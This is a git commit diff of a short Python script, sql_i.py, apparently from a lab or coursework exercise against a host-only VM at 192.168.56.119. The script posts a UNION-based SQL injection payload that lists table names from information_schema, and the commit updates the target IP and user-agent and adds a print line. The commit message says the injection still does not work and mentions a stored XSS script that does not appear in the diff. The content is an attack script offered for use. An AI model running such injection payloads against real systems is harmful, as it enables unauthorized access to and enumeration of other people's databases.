31c354325dfd1f47b5dbb4e55adc45ea81bed3cd
joao-p-marques <joao.marques.contacto@gmail.com>
2019-10-18 12:52:02 +0100

    SQLI still not working. Added stored XSS script

--- sql_i.py
+++ sql_i.py
@@ -1,8 +1,8 @@
 
 import requests
 
-base_url = 'http://192.168.56.118/'
-header = {'User-agent': 'Mozilla/5.0'}
+base_url = 'http://192.168.56.119/'
+header = {'User-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0'}
 
 data = {'type' : '1 UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM information_schema.tables'}
 # data = {'type' : '1'}
@@ -15,3 +15,4 @@ print('Elapsed time:', response.elapsed.total_seconds())
 print('Encoding:', response.encoding)
 print('Headers:', response.headers)
 print('Text:', response.text)
+print('Body:', response.content)
